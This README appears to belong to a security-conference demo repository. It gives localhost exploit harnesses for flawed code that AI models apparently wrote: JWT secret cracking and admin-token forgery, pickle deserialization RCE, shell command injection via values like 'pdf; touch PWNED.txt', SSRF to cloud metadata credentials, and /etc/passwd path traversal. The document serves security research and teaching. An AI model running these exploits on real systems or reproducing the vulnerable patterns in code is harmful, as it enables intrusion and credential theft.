# Defcon Demos

Working demo harnesses for the verified live exploits cited in the Defcon CFP pitches at [`docs/demo/`](../docs/demo/).

Each subdirectory is a self-contained reproducible exploit. The vulnerable code in every harness is **copied verbatim** from a file in `output/<model>/<file>`; only the surrounding app wiring (route handlers, `app.listen`, etc.) is added so the AI's code can be executed in isolation.

## Demos in this directory

### `jwt-weak-secret/`

Two AI-generated JWT authentication snippets with hardcoded placeholder secrets. The placeholder strings — `your-secret-key` and `YOUR_SECRET_KEY` — appear in the standard SecLists `Passwords/scraped-JWT-secrets.txt` wordlist that ships with Kali. `jwt_tool` cracks each in under a second; we then forge an admin token and the server accepts it.

| Demo | Source | Language / framework |
|---|---|---|
| `jwt_001/` | `output/gpt-4/jwt_001.py` (verbatim middleware) | Python / Flask |
| `jwt_002/` | `output/gpt-4/jwt_002.js` (verbatim middleware) | JavaScript / Express |

### `pickle-rce/`

An AI-generated `UserPreference` class that calls `pickle.load()` on a file path the caller controls. An attacker writes a malicious pickle whose `__reduce__` returns a tuple invoking `os.system`; when the victim's "load preferences on login" code path runs, arbitrary shell commands execute. Demoed end-to-end with a non-interactive marker-file proof; a Calculator-pop variant is documented for stage use.

| Demo | Source | Language / framework |
|---|---|---|
| `pickle-rce/` | `output/gpt-4/deserial_001.py` (verbatim `UserPreference` class) | Python / stdlib |

### `command-injection/`

An AI-generated `convertDocument(input, output, format)` function that f-string-interpolates all three parameters into a shell command run with `shell=True`. Pass shell metacharacters in any parameter and the shell executes them. Demoed with `OUTPUT_FORMAT='pdf; touch PWNED.txt; date >> PWNED.txt; echo'` — marker file is written before the function returns. The attempted libreoffice call fails (intentionally; format is invalid), but the injected `touch` runs first.

| Demo | Source | Language / framework |
|---|---|---|
| `command-injection/` | `output/gpt-4/cmd_004.py` (verbatim `convertDocument`) | Python / `subprocess.run(shell=True)` |

### `ssrf/`

An AI-generated `fetch_url_content(url)` function that calls `requests.get(url)` with no host validation. The prompt explicitly framed the function for AWS use ("The application runs in AWS and processes webhooks from partner APIs"), yet the AI added no IMDS block, no host allowlist, no scheme restriction. Demo runs a fake AWS Instance Metadata Service on `127.0.0.1:8169` and uses the AI's function to enumerate IAM roles and exfiltrate temporary credentials. In production the same exploit hits the real `169.254.169.254`; only the URL host differs.

| Demo | Source | Language / framework |
|---|---|---|
| `ssrf/` | `output/gpt-4/ssrf_001.py` (verbatim `fetch_url_content`) | Python / requests |

### `path-traversal/`

An AI-generated `readLogFile(filename)` function that calls `fs.readFile(filename)` with no path normalization, no jail directory, and no scheme check. Demo wraps it in a minimal Express `/logs?file=...` endpoint, then issues two curl requests: one for an intended log file, one for `/etc/passwd`. Both succeed; the second returns the system password file.

| Demo | Source | Language / framework |
|---|---|---|
| `path-traversal/` | `output/gpt-4/path_002.js` (verbatim `readLogFile`) | JavaScript / Express |

## Prerequisites

These are one-time setup steps. The reproduction commands below assume they're done.

### 1. Project Python venv

The demos use the project's existing virtualenv at `<repo-root>/venv`. If you haven't set it up:

```bash
cd <repo-root>
python3.11 -m venv venv
source venv/bin/activate
pip install -r requirements.txt   # if there is one; otherwise install ad-hoc per demo
```

### 2. Clone `jwt_tool`

`jwt_tool` is not on PyPI; clone it as a sibling tool:

```bash
mkdir -p ~/tools && cd ~/tools
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool

# Install jwt_tool's deps into the project venv
<repo-root>/venv/bin/pip install -r requirements.txt
```

The runner script expects `jwt_tool.py` at `~/tools/jwt_tool/jwt_tool.py`. Override with the `JWT_TOOL` environment variable if it lives elsewhere.

### 3. (Optional) SecLists wordlist

The vendored wordlist at `jwt-weak-secret/wordlists/ai-placeholder-secrets.txt` contains the two placeholder secrets the AI shipped, plus a handful of decoys. It's enough to demo the crack.

For a more realistic demo using the full SecLists wordlist (103,979 entries; same wordlist Kali ships):

```bash
mkdir -p ~/tools/wordlists
curl -fsSL -o ~/tools/wordlists/scraped-JWT-secrets.txt \
  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/scraped-JWT-secrets.txt

# Then pass that path as the second arg to crack-and-forge.sh:
./jwt-weak-secret/crack-and-forge.sh jwt_001 ~/tools/wordlists/scraped-JWT-secrets.txt
```

## Reproducing the jwt_001 (Flask) demo

```bash
cd demos/jwt-weak-secret/jwt_001

# Install deps. PyJWT is pinned to <2.0 to match the AI-generated code, which
# calls jwt.decode() without an algorithms= kwarg. PyJWT 2.x errors on that
# call rather than guessing — running the AI's code as written requires 1.x.
../../../venv/bin/pip install -r requirements.txt

# Start the server in one terminal
../../../venv/bin/python server.py
# (listens on http://localhost:5081)
```

In another terminal:

```bash
cd demos/jwt-weak-secret

# Crack the secret and forge an admin token
./crack-and-forge.sh jwt_001
# -> cracks 'your-secret-key' from the vendored wordlist
# -> prints the forged admin token

# Save the forged token, then send it to the server
FORGED='<paste from previous output>'
curl -s -H "x-access-tokens: $FORGED" http://localhost:5081/admin
# Expected: {"message":"AUTHENTICATED ADMIN ACCESS","ok":true,"user_id":99}
```

## Reproducing the jwt_002 (Express) demo

```bash
cd demos/jwt-weak-secret/jwt_002

# Install Node deps
npm install

# Start the server in one terminal
node server.js
# (listens on http://localhost:3081)
```

In another terminal:

```bash
cd demos/jwt-weak-secret
./crack-and-forge.sh jwt_002
# -> cracks 'YOUR_SECRET_KEY' from the vendored wordlist
# -> prints the forged admin token

FORGED='<paste from previous output>'
curl -s -H "Authorization: $FORGED" http://localhost:3081/admin
# Expected: {"message":"AUTHENTICATED ADMIN ACCESS","ok":true,"userId":99}
```

## Reproducing the pickle-rce demo

```bash
cd demos/pickle-rce
./run-demo.sh
```

The script runs all four phases (pre-check → attacker → victim → post-check) in sequence and exits cleanly. Expected last line: `RCE CONFIRMED.` followed by a timestamp written by the attacker payload.

The default payload writes a marker file (`PWNED.txt`) so the demo is automated and non-destructive. To switch to a stage-flavored visible pop:

```bash
PAYLOAD_CMD='open -a Calculator' ./run-demo.sh    # macOS
PAYLOAD_CMD='gnome-calculator &' ./run-demo.sh    # linux
```

The harness also exposes the demo as three separate steps if you'd rather drive them yourself on stage:

```bash
cd demos/pickle-rce
../../venv/bin/python attacker.py    # writes preferences.pkl
xxd preferences.pkl | head -3         # show the 'posix system' bytes in plaintext
../../venv/bin/python victim.py       # runs the AI-generated load_from_file()
cat PWNED.txt                         # arbitrary code executed
```

## Reproducing the command-injection demo

```bash
cd demos/command-injection
./run-demo.sh
```

The harness sets `OUTPUT_FORMAT='pdf; touch PWNED.txt; ...'` and calls the AI's `convertDocument`. The libreoffice call fails (the format is intentionally invalid), but the injected `touch` runs first because the shell sees `;`-separated statements. Expected last line: `RCE CONFIRMED.`

You don't need libreoffice installed — the demo only proves the injected shell commands execute. To customize the payload:

```bash
OUTPUT_FORMAT='pdf; whoami > /tmp/whoami.txt; echo' ./run-demo.sh
```

## Reproducing the ssrf demo

```bash
cd demos/ssrf
./run-demo.sh
```

The harness starts a fake AWS Instance Metadata Service on `127.0.0.1:8169`, then calls the AI's `fetch_url_content` with two malicious URLs:

1. `http://127.0.0.1:8169/latest/meta-data/iam/security-credentials/` — enumerates the IAM role
2. `http://127.0.0.1:8169/latest/meta-data/iam/security-credentials/<role>` — fetches temporary IAM credentials

Both requests succeed because the AI added no host validation. Expected output: a JSON document containing `AccessKeyId` / `SecretAccessKey` / `Token`.

The fake IMDS uses port `8169` to avoid colliding with anything you might be running on `169.254.x` (the real IMDS address is link-local, but linting tools sometimes try to resolve it). On stage, narrate that the only difference between the demo and a real EC2 SSRF is the URL host.

## Reproducing the path-traversal demo

```bash
cd demos/path-traversal
./run-demo.sh        # auto-installs Express the first time
```

The harness starts a minimal Express `/logs?file=...` endpoint, then issues two curl requests:

1. Legitimate: `?file=/tmp/path-traversal-demo-logs/app.log`
2. Malicious: `?file=/etc/passwd`

Both succeed. The AI's `fs.readFile(filename)` does not constrain the path.

## Honest caveats

These demos are intentionally minimal and have known limitations. Read these before running them in any context that matters.

### The AI code is verbatim, the harness is not

Every demo separates **verbatim AI output** (commented `---- VERBATIM FROM ... ----` blocks) from **harness wiring** (the surrounding app). The bug is in the verbatim block. The harness exists only to give the bug a runnable surface.

### PyJWT version pinning (jwt_001)

The AI generated `jwt.decode(token, secret)` with no `algorithms=` keyword argument. PyJWT 2.0 (released 2020) made `algorithms=` strictly required and errors out otherwise. To run the AI's code as written, the demo pins PyJWT < 2.0 in `jwt_001/requirements.txt`. This is a meaningful detail: a developer who copy-pasted the AI's snippet into a project using PyJWT 2.x would get a runtime error, not a silent vulnerability. The bug is real (it ships a hardcoded secret); the library version determines whether the secondary `alg:none` foothold is reachable.

### `alg:none` mitigation in jsonwebtoken (jwt_002)

`jsonwebtoken` 9.0.0 (released Dec 2022, CVE-2022-23540) refuses to verify unsigned tokens unless the caller explicitly passes `algorithms` containing `"none"`. The weak-secret crack shown in the demo works against any version of `jsonwebtoken`. The `alg:none` forgery technique that some older write-ups describe is blocked by current jsonwebtoken — we tested both 8.5.1 (vulnerable) and 9.0.3 (mitigated) during pitch preparation. The demo here exercises only the weak-secret path.

### Wordlist scope

The vendored `ai-placeholder-secrets.txt` is 20 entries. It exists to make the demo runnable without external downloads, and so the crack times we cite are reproducible across environments. The pitches' "0.24 seconds against the standard SecLists wordlist" measurement uses the full 103,979-entry SecLists wordlist (see "Optional" prerequisite above). Both produce the same outcome — the secret is cracked — only the search space size differs.

### Network exposure

All servers bind to `localhost` (or `127.0.0.1`) only and run on non-standard ports (5081, 3081, 3091, 8169). They have no SSL, no rate limiting, and no authentication beyond whatever vulnerability is the point of each demo. Do not deploy any of them to anything reachable.

### Pickle RCE and command-injection demos run arbitrary shell commands

Both `pickle-rce/` and `command-injection/` shell out to commands the harness builds. The default payloads write a marker file (`PWNED.txt`) and are harmless, but `pickle-rce/` honors a `PAYLOAD_CMD` environment variable and `command-injection/` honors `OUTPUT_FORMAT`. Anything you put in either is literal arbitrary command execution. **Read your own command first.** That's the point of the demos. Treat each directory as untrusted between runs (the `.gitignore` files exclude generated artifacts).

### SSRF demo serves fake credentials only

The `ssrf/` demo runs a fake IMDS at `127.0.0.1:8169` returning hardcoded fake AWS credentials. The credentials are obviously not valid (`ASIAFAKEDEMO00000000`), and we deliberately did not use real-shaped values to avoid alarming any real AWS detection systems if a screenshot leaks. In a real EC2 environment, the AI's `fetch_url_content` would return real, usable IAM credentials when pointed at `http://169.254.169.254/`.

### Path-traversal demo reads real local files

The `path-traversal/` demo intentionally reads `/etc/passwd` to prove the bug. On macOS that file is unprivileged and harmless; on a multi-user system you may not want to scroll it on stage. The harness reads only the first 5 lines. Customize as needed.

## What's not in here

Six of the eleven CFP-cited excerpts have executable demos here (jwt_001, jwt_002, deserial_001, cmd_004, ssrf_001, path_002). The others are pattern critiques or breadth-tour examples that don't produce a single-shot live exploit:

- `jwt_003`, `jwt_004` — pattern critiques only; no live exploit by design (documented in their excerpt files).
- `jwt_005-vs-codex-app` — a side-by-side comparison, not a single executable.
- The six `tour-*` excerpts — breadth examples shown as slides during the talk, not run as demos.

Building demos for these would not strengthen the pitches we drafted, and constructing them would either misrepresent the bugs or require additional infrastructure (calling-context wiring, broken pipelines, etc.) outside the scope of what the AI generated.

## Investigated and cut from the talk

During pitch preparation we built and verified two additional demos that don't appear in the talk plan. They worked end-to-end but were rejected for editorial reasons — not because the demos failed.

| Demo | Why it worked | Why it was cut |
|---|---|---|
| `output/o3/jwt_006.js` algorithm confusion | Verified live on `jsonwebtoken` 8.5.1 — public key reused as HMAC secret with `algorithms: ['HS256','RS256']`; forged token accepted as admin | Modern `jsonwebtoken` (≥ 9.0.0) blocks the attack at the library level. Demo would require pinning a 3+ year old library version, which weakens the punch line — even though the bug is real and was generated unprompted by the AI |
| `output/gpt-4o/gateway_004.py` no-verify gateway | Verified live — `jwt.decode(token, options={"verify_signature": False})` accepts forged claims with no signature check | The prompt itself instructs `verify=False for development speed`. The bug is in the prompt, not the AI. Doesn't fit the talk's "what AI ships when no one mentions security" framing |

If either demo would help in a future talk variant, the test infrastructure can be reconstructed from `/tmp/jwt006_test*` and `/tmp/gateway004_test/` fragments documented in the audit notes (`docs/demo/.jwt-bug-audit.md`).
